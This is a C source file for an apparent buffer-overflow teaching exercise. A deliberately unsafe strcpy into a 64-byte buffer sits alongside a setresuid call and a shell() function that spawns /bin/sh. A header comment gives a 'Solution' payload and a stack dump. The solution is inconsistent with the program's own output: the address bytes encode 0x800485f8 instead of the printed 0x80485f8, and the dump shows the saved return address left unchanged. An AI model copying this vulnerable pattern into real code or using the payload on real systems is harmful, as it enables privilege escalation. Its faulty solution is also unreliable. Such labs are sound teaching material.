/*
** Solution
** ./buffer_overflow $( perl -e 'print "A"x68 . "\xf8\x85\x04\x80" ' )
** 
** shell function = 0x80485f8
** Stack dump:
** 0xffffd600: 0xffffd7f3 (first argument)
** 0xffffd5fc: 0x080486bc (saved eip)
** 0xffffd5f8: 0xffffd600 (saved ebp)
** 0xffffd5f4: 0x800485f8
** 0xffffd5f0: 0x41414141
** 0xffffd5ec: 0x41414141
** 0xffffd5e8: 0x41414141
** 0xffffd5e4: 0x41414141
** 0xffffd5e0: 0x41414141
** 0xffffd5dc: 0x41414141
** 0xffffd5d8: 0x41414141
** 0xffffd5d4: 0x41414141
** 0xffffd5d0: 0x41414141
** 0xffffd5cc: 0x41414141
** 0xffffd5c8: 0x41414141
** 0xffffd5c4: 0x41414141
** 0xffffd5c0: 0x41414141
** 0xffffd5bc: 0x41414141
** 0xffffd5b8: 0x41414141
** 0xffffd5b4: 0x41414141
** 0xffffd5b0: 0x41414141 (beginning of buffer)
*/

#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include "dump_stack.h"

/*
 * Goal: Get the program to run this function.
 */
void shell(void) {
    execl("/bin/sh", "sh", NULL);
}

void vuln(char *str) {
    char buf[64];
    strcpy(buf, str);
    dump_stack((void **) buf, 21, (void **) &str);
}

int main(int argc, char **argv) {
    if (argc != 2) {
        printf("Usage: buffer_overflow [str]\n");
        return 1;
    }

    uid_t euid = geteuid();
    setresuid(euid, euid, euid);
    printf("shell function = %p\n", shell);
    vuln(argv[1]);
    return 0;
}
